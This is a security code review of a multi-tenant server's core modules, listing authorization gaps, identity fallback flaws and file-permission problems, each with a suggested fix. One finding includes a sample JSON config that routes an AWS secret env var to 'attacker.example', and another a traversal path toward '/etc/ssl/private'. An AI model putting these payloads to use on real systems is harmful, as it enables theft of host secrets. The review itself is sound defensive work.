# Code review — core / multi-tenant isolation / config / security

Scope: `packages/server/src/core/*` (config, middleware, tenant-context,
tenant-id, global-ops, db-pool, identity-resolvers, paths, llm,
pi-models, model-retry, mcp-manager, agent-seeds, worker-agents-fs) +
`packages/server/src/boot/routes-core.ts`, against ADR‑0001
(`docs/architecture/multi-tenant.md`).

Read-only. Line numbers are from the file as it exists on disk today.

The design contract is generally sound — filesystem-scoped tenants,
whitelist-gated tenant config, LRU DB pool, chain-of-resolvers identity
— and the failure modes I found are mostly at the *edges* of that
contract (routes, placeholder expansion, evictions), not in the core
model. But two of them are lethal, so I want to be crisp about them
up front.

---

## BLOCKER

### B1 — `/api/admin/models/providers` has no admin authorization and mutates *global* config from any tenant identity
File: `packages/server/src/boot/routes-core.ts` lines 155–224
(and helpers 226–357).

The route is mounted on the same app that `tenantMiddleware` runs
against. `req.ctx` will be set for **any** identity the resolver chain
returns — cookie-set, env-set, or default-dev. There is no admin flag,
no role check, no tenant-scoping of what is being written. The URL
prefix "admin" is cosmetic.

Both handlers:

- `GET  /api/admin/models/providers` (line 155): calls
  `loadGlobalConfig(getTianshuHome())` and returns the entire global
  providers catalog to the caller. `apiKey` is masked, good — but
  every `baseUrl`, `api`, `group`, `models[]` and `defaultModel` /
  `defaultModelId` from the **process-wide** file is disclosed to a
  request that authenticated as tenant `foo`. That already violates
  ADR‑0001 §2 ("no cross-tenant table" / physical isolation).

- `PUT  /api/admin/models/providers` (line 177): calls
  `loadGlobalConfig` → mutates → `writeGlobalConfig`. A user in tenant
  `foo` can:
    1. wipe the entire global provider catalog (see H1 below);
    2. rewrite `defaultModel` / `defaultModelId` globally, so every
       *other* tenant that inherits from global (see
       `mergeConfigs` §7 in the ADR) is silently redirected;
    3. plant a provider whose apiKey is a `${SECRET}` env-var
       placeholder pointing at an attacker-controlled baseUrl
       (see B2).

Why it matters: this is the "cross-tenant data leak is physically
impossible" guarantee (ADR‑0001 "Consequences ▸ Good") broken in one
route. In a self-host with two tenants (say a customer's `acme` and
`bruce`), a user in `acme` can pave over `bruce`'s model config.
In the default-dev deployment the practical impact is smaller (there
*is* only one tenant), but every future prod deployment inherits this
route as-is.

Suggested fix:
- Gate the whole `/api/admin/*` prefix on an admin capability
  independent of tenant identity. The simplest v0 gate: require
  a `role: "admin"` boolean on `RequestCtx`, set only by an
  operator-configured resolver (JWT `admin:true`, env
  `TIANSHU_ADMIN_TENANT`, or an on-disk allow-list). Deny by default.
- These routes edit **global** config → they should not be under
  `tenantMiddleware` at all. Move them to a separate router mounted
  with `adminMiddleware` (which itself validates the caller against a
  server-only mechanism — signed cookie, mTLS, unix socket, whatever).
- Until the auth gate lands, at minimum reject the route when
  `req.ctx.identitySource === "default-dev"` and there is more than
  one tenant on disk. This is a stopgap, not a fix.

### B2 — `${VAR}` / `${VAR:-fallback}` expansion in `apiKey` lets a tenant admin exfiltrate host process env vars to an attacker-controlled URL
File: `packages/server/src/core/llm.ts` lines 130–176.

`resolveApiKey` calls `expandEnvPlaceholders(info.apiKeyTemplate)`
which replaces `${NAME}` / `${NAME:-fallback}` with `process.env[NAME]`
at request time. `apiKey` is a **tenant-overridable** field
(`TENANT_WHITELIST` in `config.ts:284`; `ProviderEntry.apiKey`).

Combined with B1 (any user can write to the *global* provider
catalog), and with any tenant admin's ability to hand-edit
`<tenant>/config.json` or reach any future `PUT
/api/tenant/config/models` route, the attack is:

```json
// tenant config OR (via B1) global config
{
  "models": {
    "providers": {
      "steal": {
        "baseUrl": "https://attacker.example",
        "apiKey": "${AWS_SECRET_ACCESS_KEY}"
      }
    },
    "defaultModelId": "steal/anything"
  }
}
```

Any subsequent chat request that selects `steal/*` (or that model
becomes the tenant default) resolves the apiKey to the expanded
env-var and sends it as `Authorization` to `https://attacker.example`.
The attacker logs the header. Same for `DATABASE_URL`, private-CA
tokens, cloud provider creds, whatever the operator has in the
tianshu process env.

`baseUrl` is also un-validated on the way in (no `http(s)://` check,
no allow-list) — see `parseProvidersInput` `routes-core.ts:279–286`.

Why it matters: this is a straight secret-exfiltration primitive from
any tenant-write-capable identity to an internet-controlled endpoint.
It doesn't need a bug elsewhere; the placeholder feature was
deliberately added ("secrets never sit in memory longer than
necessary" — `config.ts:65`) and its threat model didn't account for
the tenant author being untrusted.

Suggested fix (pick either or both):
- Restrict the placeholder domain: only expand env vars whose names
  start with an operator-provided prefix (e.g. `TIANSHU_KEY_*`), or
  only variables named in an allow-list under global-only config
  (`GlobalOnlyConfig.envKeyAllowlist: string[]`). Anything else
  expands to `""`.
- Or: expand placeholders **only when the value came from the global
  config**, never from tenant config. The tenant config would then
  hold literal keys or nothing. Track provenance on the
  `ResolvedModelInfo` (`apiKeyTemplate` + `apiKeyProvenance:
  "global" | "tenant"`).
- Reject `baseUrl` that isn't in a per-tenant / global allow-list, or
  at least log at INFO on every request where a `${VAR}` in apiKey
  resolved and the baseUrl doesn't match a well-known provider host.

---

## HIGH

### H1 — PUT models providers silently drops any provider missing from the body
File: `routes-core.ts:198–214` + `parseProvidersInput` at 246–304.

`parseProvidersInput` iterates `Object.entries(input as ...)` and
builds `out` only from provider ids present in the input. Providers
that exist in `prev` (loaded from disk) but are omitted from the PUT
body are dropped, along with their stored `apiKey`.

The mask-sentinel preservation logic at 288–295 only preserves the
apiKey when the client *sent* the provider with `apiKey ===
API_KEY_MASK`. It does not preserve providers the client didn't send
at all. Combine with B1 and any tenant user can `PUT { providers: {} }`
and wipe every stored key.

Suggested fix:
- Model the endpoint as a *patch* not a *put*: `{ providers: { openai:
  {…} } }` merges into the stored providers; explicit deletion
  requires `{ providers: { openai: null } }` (or a separate DELETE
  route). This matches how MCP servers are handled
  (`plugins-routes.ts:302`).
- Or: return 409 if the input omits an id that exists in `prev` and
  the client did not pass an `?allowDelete=true` query flag.

### H2 — Middleware's built-in "fallback to default tenant" is dev-only behaviour baked into the shared handler
File: `packages/server/src/core/middleware.ts:112–139`.

When a resolver returns `{kind:"ok", tenantId:"nonexistent"}` and
`ops.open()` throws `TenantNotFoundError`, the middleware **silently**
opens the `default` tenant with `DEV_USER_ID`, sets the request ctx,
and returns 200 with `X-Tianshu-Identity-Fallback` set. Two
consequences:

1. Any attacker who can influence the cookie / env can *always* get
   an authenticated request as `default/dev` by choosing a tenant
   id that doesn't exist. In default-dev deployments that's a
   full-privilege session for anyone hitting the endpoint.
2. Even for a prod deployment that has replaced
   `DEV_RESOLVER_CHAIN`, this fallback code path is still active
   because it lives in the middleware itself, not in the resolver
   chain. The only way to disable it is to know it exists and not
   pass the request through `tenantMiddleware`.

The comment above the block ("Common in dev: user typo'd
`?tenant=foo`") is honest but doesn't gate the behaviour on being in
dev.

Suggested fix:
- Move the fallback into a resolver (`missingTenantFallbackResolver`)
  and drop it from `middleware.ts`. `DEV_RESOLVER_CHAIN` can put it
  in front of `defaultDevResolver`; production chains leave it out
  and get a proper `404 tenant_not_found`.
- Or: expose it as `TenantMiddlewareOpts.fallbackTenantOnMissing?:
  string`. Off by default.
- Independently: never downgrade the `userId` to `DEV_USER_ID` when
  falling back. Right now
  `req.ctx.userId = DEV_USER_ID` regardless of what the resolver
  returned, which is a *different* identity than the caller
  claimed. Either fall back to `resolution.userId` (matching what
  the caller sent) or refuse entirely; downgrading silently is the
  worst option.

### H3 — DbPool LRU eviction can close a DB that another code path is still holding
File: `packages/server/src/core/db-pool.ts:100–116`
(`evictIfNeeded`), and `tenant-context.ts:9–24` (the ctx holds
`public readonly db: DB`).

`TenantContext` captures `db` by reference and hands it to routes /
long-lived tasks. `pool.get()` bumps to MRU on each call, but any
consumer that stores the `db` from an *earlier* call and reuses it
later (worker tasks, stream handlers that write history after the LLM
call completes, `Solutions` bookkeeping — plausible given the code
surface, though most of it is out of scope for this review) will hit
`SqliteError: The database connection is not open` when the pool has
evicted the DB in the meantime. Node is single-threaded so the crash
won't corrupt data, but a mid-stream failure while writing the
assistant message to `messages` would drop the turn.

Also, `close()` on an evicted DB happens synchronously inside
`evictIfNeeded` — good, no race — but subsequent uses of that DB
instance from stale references remain broken.

Suggested fix:
- Track live "leases" on a DB: `get()` returns a handle with
  `release()`, and eviction refuses to close a DB with active leases
  (LRU walks past it). The connection cache then behaves as a *soft*
  cap, not a hard one, which is what the ADR §10 comment ("Reopening
  a DB is cheap.") actually assumes.
- Or, since better-sqlite3 statements are cheap to re-prepare, resolve
  the DB *at the point of use* rather than at ctx-open time. Add a
  `ctx.withDb(fn)` accessor that calls `pool.get(this.tenantId)` each
  time and never caches the reference. `TenantContext.db` becomes a
  getter that goes through the pool.

### H4 — `config.ts` / `paths.ts` functions accept unvalidated tenantId; defence-in-depth failure
Files: `config.ts` (all `loadTenantConfig` / `writeTenantConfig` /
`getTenantConfigPath` / `resolveTenantConfig` call sites);
`paths.ts` all `getTenant*` and `getUserHomeDir`;
`mcp-manager.ts:82` `reload(tenantId)`; `db-pool.ts:87` `open(tenantId)`.

None of these validate `tenantId`. All rely on the caller running
`validateTenantId` first. `GlobalOps.open/create/exists` correctly
validate, but the exported functions themselves don't.

Consequences today:
- Any future route that forwards a body param straight into
  `loadTenantConfig(req.body.tenantId, ...)` will happily write to
  `../<anywhere>/config.json`.
- The URL/CLI test cases already exercise unvalidated tenant ids
  (e.g. `paths.test.ts:16` `getTianshuHome`), so the check has been
  intentionally left to the caller.

Suggested fix:
- Call `validateTenantId(tenantId)` at the top of `loadTenantConfig`,
  `writeTenantConfig`, `resolveTenantConfig`, and (as belt-and-braces)
  `DbPool.get`. This is not a hot path; a regex match per open is
  negligible.
- `getUserHomeDir` should also validate `userId` (see M1) or at least
  refuse `.` / `..` / any string containing `/`.

---

## MEDIUM

### M1 — `parseIdentityCookie` accepts `.`, `..`, and mixed case for both tenantId and userId
File: `identity-resolvers.ts:190–219` + `isSafeId` at 221–224.

`isSafeId` = `/^[A-Za-z0-9._-]+$/` and `length <= 64`. This is more
permissive than `TENANT_ID_RE` (`^[a-z0-9][a-z0-9_-]{1,31}$`). Two
effects:

- `tenantId = "Default"` (mixed case) parses successfully out of the
  cookie, then `validateTenantId` throws → 500 (`next(err)`). It
  should be `null` from the parser so the chain can fall through.
- `userId = ".."` parses successfully. Nothing in this module or in
  `getUserHomeDir` validates userId. `path.join(usersDir, "..")`
  resolves to `<workspace>/` — one dir up from `users/`. Not a
  workspace-root escape (path.join won't let you), but it makes the
  effective user "home" the tenant's shared workspace dir, which is
  semantically wrong.
- `userId = "."` yields the users/ directory itself; a subsequent
  `path.join(userHome, "USER.md")` becomes `users/USER.md`, again
  not what any code expects.

Suggested fix:
- Tighten `isSafeId` to match `TENANT_ID_RE`, and add explicit
  rejection of `.`, `..`, leading `.`, and leading `-`.
- Have `getUserHomeDir` (paths.ts:140) run the same validator.

### M2 — Concurrent PUTs on `/api/admin/models/providers` are lost-update racy
File: `routes-core.ts:177–224`.

Handler is read → mutate → write with no versioning. Two admins
clicking Save simultaneously silently lose one set of changes.
`writeTenantConfig`/`writeGlobalConfig` are atomic per-write (temp +
rename), so the on-disk file is never torn — but the "last writer
wins on the whole document" behaviour will surprise users editing
non-overlapping providers.

Suggested fix:
- Return an `etag` derived from a hash of the loaded config; require
  `If-Match: <etag>` on PUT; reject with 409 on mismatch.
- Cheaper alternative: patch semantics (see H1) reduces the collision
  window to single-provider grain.

### M3 — `resolveApiKey` silently returns `"test-key-1"` when nothing is configured
File: `llm.ts:135–139`.

Comment says this "matches the closed-source repo's local SAP
proxy". In an actual deployment where a provider was configured
without a key, the request goes out with `Authorization: Bearer
test-key-1` and the provider returns 401, which the retry loop then
treats as an auth-refresh candidate → re-resolves to the same
`test-key-1` → retries → burns budget.

More importantly, it's easy to accidentally leak `test-key-1` into
prod telemetry as "a valid-looking key" that isn't.

Suggested fix:
- Fail fast when the expansion is empty *and* `DEFAULT_API_KEY` is
  unset. Return a distinctive error object the chat handler can
  surface as "no api key configured for provider X" instead of
  letting the provider reject the request.

### M4 — Middleware surfaces resolver exception message directly in the 500 body
File: `middleware.ts:87–96`.

```
res.status(500).json({
  error: "identity_resolver_threw",
  resolver: error.resolver,
  message: error.message,     // ← unfiltered
});
```

A future JWT / OIDC resolver's internal exception (`"key rotation
lookup failed: kid=... jwks_url=..."`, `"private key decrypt failed:
<stack with paths>"`) will end up in the browser. Same for the 500
`config_read_failed` in `routes-core.ts:171`.

Suggested fix:
- Log the details server-side (already happens via next(err) in most
  paths); return a stable public error code + request id.

### M5 — `isSoftDeletedDirName` uses `.includes(".deleted")`
File: `paths.ts:152–156`.

Matches anywhere in the name. Not exploitable via tenant creation
(`validateTenantId` blocks `.`), but any manual `mkdir
foo.deleted-stuff` under `tenants/` silently disappears from
`GlobalOps.list()`. Similarly, an operator archiving a tenant with
`mv foo foo.deleted.old` believes it's soft-deleted the same way as
timestamped, which is fine — but the design intent should be
explicit.

Suggested fix:
- Anchor: `/\.deleted(\.\d+)?$/`.

### M6 — Retry policy has no upper bound on `maxAttempts` / `maxDelayMs`
File: `model-retry.ts:132–163` (`resolveResilience`).

`clampInt` uses `min` only. `maxAttempts: 1_000_000` in tenant config
is accepted verbatim. Combined with rate-limit floor + jitter, a
misconfigured tenant can keep a stream open for hours in retry
backoff (`sleep(delay, signal)`), pinning process memory (the pi-ai
harness state) and their eventing socket.

Suggested fix:
- Cap `maxAttempts` to some sane ceiling (e.g. 12) and
  `maxDelayMs` to e.g. 5 minutes. Tenant author can still turn it
  down; not up beyond operator limits.

### M7 — Tenant root dir + db.sqlite created with default umask on multi-user hosts
File: `global-ops.ts:105`, `db-pool.ts:87–91`.

`fs.mkdirSync(root, { recursive: true })` and
`new Database(dbPath)` use the process umask. Only `secrets/`
(`global-ops.ts:108`) is explicitly `0o700`. On a shared Linux host
with `umask 022`, `db.sqlite` is `0644` — every local user can read
every tenant's messages by pointing `sqlite3` at it. Same for
`config.json` (`writeTenantConfig` writes 0o600, good — but the
`.tmp.*` sibling is also written via `fs.writeFileSync(tmp, ...,
{ mode: 0o600 })`, and the tenant *directory* itself is 0755, so
directory listing enumerates every tenant id to any local user).

Suggested fix:
- `mkdirSync(root, { recursive: true, mode: 0o700 })` on tenant root.
- On the DB file: after `new Database(dbPath)` (or before), `chmodSync(dbPath, 0o600)`.
- Optionally chmod the tenant workspace dir too, subject to whatever
  the sandbox mount expects.

### M8 — Agent seed source path is not validated against plugin dir
File: `agent-seeds.ts:88–100`.

`srcDir = path.resolve(pluginDir, seed.path)` — nothing checks
`ensureInside(pluginDir, seed.path)`. A malicious plugin manifest
with `seed.path: "../../../etc/ssl/private"` (or, more realistically,
"../../.tianshu/tenants/other/workspace") could try to copy sensitive
host files into `workers/<seed.id>/`. Destination is safely inside
the tenant, but the *content* copied could be anything the tianshu
process can read.

This is a supply-chain issue rather than a tenant-boundary one, but
the code should still refuse.

Suggested fix:
- `ensureInside(pluginDir, seed.path)` before `fs.cpSync`. The
  helper already exists in `paths.ts:171`.

---

## LOW / NIT

### L1 — `envResolver` doesn't validate `TIANSHU_DEV_TENANT` / `TIANSHU_DEV_USER`
`identity-resolvers.ts:79–95`. `.trim()` and pass through. If the
operator set `TIANSHU_DEV_TENANT="Prod"` (typo), the request will 500
in `ops.open` rather than 401 / fall through the chain. Minor
usability.

### L2 — `expandEnvPlaceholders` regex has `/gi` flag with an already case-agnostic char class
`llm.ts:170–173`. Works correctly but reads as if `A-Z0-9_` is
uppercase-only; with `/i` it matches lower-case too. Either drop `/i`
and match only `[A-Z0-9_]` (canonical env var shape) or make the
class explicit.

### L3 — `parseModelsInput` accepts negative / absurd `contextWindow` / `maxTokens`
`routes-core.ts:322–336`. Doesn't bound-check. Feeds into the
harness later and will surface as a downstream error. Nit.

### L4 — Whitelisted fields aren't schema-validated when read
`config.ts:295–303`. `assertOnlyOverridable` only checks *field
names*. A tenant hand-editing `apiKeys: { openai: 12345 }`
(number instead of string) passes read, then blows up much later in
`resolveApiKey` (`info.apiKeyTemplate` is `undefined` because it's
not read from `apiKeys` at all — but the same shape issue applies to
`models.providers[*].apiKey`). Not exploitable, just noisy.

### L5 — `defaultDevResolver` ships in the default chain even though tests can compose their own
`identity-resolvers.ts:170–176`. Fine for dev; the security note in
`middleware.ts:20–23` calls it out. Nit — consider making
`DEV_RESOLVER_CHAIN` require an explicit `allowDefaultDev: true`
option at chain-build time so grep-friendly.

### L6 — `pi-models.ts` `ensureBuiltinsRegistered` reads a module-scoped `registered` flag
`pi-models.ts:44–49`. If two tianshu processes run against the same
Node worker (worker_threads), fine, each has its own registration.
Nit-level; no correctness issue.

### L7 — `evictIfNeeded` early-exits on falsy `lru`
`db-pool.ts:100–116`. `lru = this.entries.keys().next().value`. If
tenantId were the empty string it would break the loop, but
`validateTenantId` rejects empty strings. Nit — use
`if (this.entries.size === 0) break;` for clarity.

### L8 — `TenantContext` exposes `db` publicly and permanently
`tenant-context.ts:17–22`. Contributes to H3 (see above). Making
`db` a getter that goes through the pool would be a mechanical
change with a big robustness win.

### L9 — `AutoCreateDefault` swallows the case where dev tenant *creation* races
`dev-mode.ts:32–68`. `list()` → `create()` isn't atomic; two
processes booting simultaneously (e.g. cli + web dev) will race and
one will throw `TenantAlreadyExistsError` past the caller. Unlikely
in practice; nit.

---

## Cross-cutting observations (not findings)

- **The isolation contract holds at the storage layer.** Once a
  request has a `TenantContext`, DB queries and workspace paths are
  scoped by construction — `tenant.db`, `tenant.workspaceDir`,
  `tenant.userHomeDir(userId)`. There are no ambient `WHERE tenant_id
  = ?` clauses that could be forgotten. The failures I found are all
  at the boundary where an untrusted string becomes a
  TenantContext.
- **The identity chain design is good.** Making the resolver list
  the extension point and keeping the middleware dumb is the right
  shape for adding subdomain / JWT / api-key resolvers without
  touching middleware. My H2 concern is a specific mistake in the
  *middleware's* fallback code, not in the chain design.
- **`ensureInside` exists and is used in tests, but is under-used in
  agent-seeds / worker-agents-fs.** Reach for it whenever a
  user- or plugin- provided path meets a filesystem call.
- **`model-retry.ts` is careful, well-documented and largely
  correct.** The rate-limit floor + retry-after honouring is
  genuinely nice. Only nit is the missing upper-bound clamp (M6).
- **Retry policy correctly turns off SDK-internal `maxRetries: 0`
  per attempt** (line 626–ish inside `wrapStreamFn`). That deserves
  a comment in the resilience section of the ADR, since it's the
  only reason the retry semantics are consistent.

---

## Top 3 things to fix first

1. **B1 — Gate `/api/admin/models/providers` behind a real admin
   capability and stop reading/writing global config from a
   tenant-authenticated request.** Every other multi-tenant
   guarantee is undermined until this is fixed.
2. **B2 — Strip or restrict `${VAR}` expansion in tenant-writable
   `apiKey` fields.** Either tie expansion to a global-config
   allow-list of env-var names, or refuse expansion when the value
   was loaded from tenant config. Combined with B1 this closes the
   exfiltration primitive.
3. **H2 — Move the "tenant not found → default tenant" fallback out
   of `tenantMiddleware` into an explicit resolver, and never
   downgrade the userId to `DEV_USER_ID`.** Right now every future
   prod deployment inherits a silent identity-downgrade that turns
   a typo'd tenant into a full `default/dev` session.
